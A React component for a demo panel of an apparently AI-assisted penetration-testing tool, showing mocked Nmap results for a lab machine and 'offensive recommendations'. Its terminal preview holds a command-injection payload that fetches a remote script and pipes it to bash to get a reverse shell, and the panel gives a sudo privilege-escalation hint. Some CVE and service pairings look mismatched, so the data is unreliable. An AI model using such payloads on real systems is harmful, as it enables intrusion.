import React from "react";
import { Sparkles, ArrowRight, Zap, CheckCircle2, Lock } from "lucide-react";
import { THEME_PRESETS, ThemePreset } from "../styles/theme";

interface AiScanIntelShowcaseProps {
  progress: number; // 0 to 1 progress within Act 4
  themePreset?: ThemePreset;
}

export const AiScanIntelShowcase: React.FC<AiScanIntelShowcaseProps> = ({
  progress,
  themePreset = "oled",
}) => {
  const tokens = THEME_PRESETS[themePreset];

  return (
    <div
      style={{
        backgroundColor: tokens.surfaceCard,
        borderRadius: 14,
        border: `1px solid ${tokens.cyberAccentGlow}`,
        padding: 18,
        height: "100%",
        display: "flex",
        flexDirection: "column",
        gap: 14,
        boxShadow: `0 10px 30px rgba(0, 0, 0, 0.6), 0 0 20px ${tokens.cyberAccentGlow}`,
        position: "relative",
      }}
    >
      {/* Top Banner: Local Redaction & 0-Egress Guarantee */}
      <div
        style={{
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          borderBottom: `1px solid ${tokens.borderSubtle}`,
          paddingBottom: 10,
        }}
      >
        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          <div
            style={{
              width: 32,
              height: 32,
              borderRadius: 8,
              backgroundColor: tokens.cyberAccentBg,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              border: `1px solid ${tokens.cyberAccent}66`,
            }}
          >
            <Sparkles size={18} color={tokens.cyberAccent} />
          </div>
          <div>
            <div style={{ fontSize: 14, fontWeight: 700, color: tokens.textPrimary }}>
              BYOK AI Recon & Scan Intel
            </div>
            <div style={{ fontSize: 10, color: tokens.textMuted }}>
              Automated service triaging · Client-side redactor · 0-Egress
            </div>
          </div>
        </div>

        <div
          style={{
            display: "flex",
            alignItems: "center",
            gap: 6,
            backgroundColor: tokens.cyberAccentBg,
            border: `1px solid ${tokens.cyberAccent}55`,
            padding: "4px 10px",
            borderRadius: 8,
            fontSize: 10,
            fontWeight: 700,
            color: tokens.cyberAccent,
          }}
        >
          <Lock size={11} />
          <span>LOCAL REDACTION ACTIVE (ZERO CLOUD EGRESS)</span>
        </div>
      </div>

      {/* Main Content Grid: Ingested Scan on Left, AI Advice on Right */}
      <div style={{ display: "grid", gridTemplateColumns: "1.1fr 1fr", gap: 14, flex: 1 }}>
        {/* Left: Ingested Target & Nmap Services */}
        <div
          style={{
            backgroundColor: tokens.surfaceBase,
            borderRadius: 10,
            border: `1px solid ${tokens.borderSubtle}`,
            padding: 12,
            display: "flex",
            flexDirection: "column",
            gap: 10,
          }}
        >
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
            <span style={{ fontSize: 11, fontWeight: 700, color: tokens.textSecondary, letterSpacing: "0.05em" }}>
              INGESTED SCAN: 10.10.11.224 [Sau]
            </span>
            <span style={{ fontSize: 9, color: tokens.cyberAccent, fontFamily: "monospace" }}>NMAP XML // 3 PORTS OPEN</span>
          </div>

          <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
            {[
              { port: "55555/tcp", service: "http", product: "Maltrail v0.53", vuln: "CVE-2023-27163", severity: "CRITICAL", color: "#EF4444" },
              { port: "80/tcp", service: "http", product: "nginx 1.18.0", vuln: "Reverse Proxy", severity: "INFO", color: tokens.cyberAccent },
              { port: "22/tcp", service: "ssh", product: "OpenSSH 8.2p1", vuln: "Filtered Auth", severity: "LOW", color: tokens.cyberAccent },
            ].map((s, idx) => (
              <div
                key={idx}
                style={{
                  backgroundColor: tokens.surfaceElevated,
                  border: `1px solid ${s.color}33`,
                  borderRadius: 6,
                  padding: "6px 10px",
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center",
                  fontSize: 10,
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                  <span style={{ fontFamily: "monospace", color: tokens.textPrimary, fontWeight: 700 }}>{s.port}</span>
                  <span style={{ color: tokens.textMuted }}>{s.product}</span>
                </div>
                <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                  <span style={{ color: "#FBBF24", fontFamily: "monospace" }}>{s.vuln}</span>
                  <span
                    style={{
                      fontSize: 8,
                      fontWeight: 800,
                      backgroundColor: `${s.color}22`,
                      color: s.color,
                      padding: "1px 5px",
                      borderRadius: 4,
                    }}
                  >
                    {s.severity}
                  </span>
                </div>
              </div>
            ))}
          </div>

          {/* Quick Terminal Preview */}
          <div
            style={{
              backgroundColor: tokens.surfaceSunken,
              borderRadius: 6,
              padding: 8,
              fontFamily: "monospace",
              fontSize: 9,
              color: tokens.cyberAccent,
              marginTop: "auto",
              border: `1px solid ${tokens.cyberAccent}33`,
            }}
          >
            <div>$ curl -s http://10.10.11.224:55555/login -d &quot;username=;curl 10.10.14.88:9001/rev.sh|bash&quot;</div>
            <div style={{ color: tokens.textMuted, marginTop: 2 }}>[+] Exploit payload delivered. Reverse shell incoming...</div>
          </div>
        </div>

        {/* Right: AI Guidance & Automated Next Steps */}
        <div
          style={{
            backgroundColor: tokens.surfaceBase,
            borderRadius: 10,
            border: `1px solid ${tokens.borderStrong}`,
            padding: 12,
            display: "flex",
            flexDirection: "column",
            justifyContent: "space-between",
            boxShadow: `0 0 20px ${tokens.cyberAccentGlow}`,
          }}
        >
          <div>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 8 }}>
              <div style={{ display: "flex", alignItems: "center", gap: 6, color: tokens.cyberAccent, fontSize: 11, fontWeight: 700 }}>
                <Zap size={13} />
                <span>OFFENSIVE RECOMMENDATION</span>
              </div>
              <span
                style={{
                  fontSize: 9,
                  backgroundColor: "rgba(239, 68, 68, 0.15)",
                  color: "#F87171",
                  border: "1px solid rgba(239, 68, 68, 0.3)",
                  padding: "1px 6px",
                  borderRadius: 4,
                  fontWeight: 700,
                }}
              >
                CVSS 9.8 RCE
              </span>
            </div>

            <p style={{ fontSize: 10, color: tokens.textSecondary, lineHeight: 1.45, margin: "0 0 8px 0" }}>
              Maltrail v0.53 is vulnerable to unauthenticated OS Command Injection via the <code style={{ color: tokens.cyberAccent }}>username</code> parameter on port 55555.
            </p>

            <div style={{ display: "flex", flexDirection: "column", gap: 5 }}>
              <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 10, color: tokens.textMuted }}>
                <CheckCircle2 size={11} color={tokens.cyberAccent} />
                <span>Foothold Path: Maltrail RCE ➔ User Shell</span>
              </div>
              <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 10, color: tokens.textMuted }}>
                <CheckCircle2 size={11} color={tokens.cyberAccent} />
                <span>PrivEsc Path: sudo systemctl status trail ➔ Root Shell</span>
              </div>
            </div>
          </div>

          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              backgroundColor: tokens.cyberAccentBg,
              border: `1px solid ${tokens.cyberAccent}55`,
              borderRadius: 8,
              padding: "8px 12px",
              marginTop: 10,
            }}
          >
            <span style={{ fontSize: 10, fontWeight: 700, color: tokens.cyberAccent }}>
              Auto-generate payload in RevShell Studio
            </span>
            <ArrowRight size={13} color={tokens.cyberAccent} />
          </div>
        </div>
      </div>
    </div>
  );
};
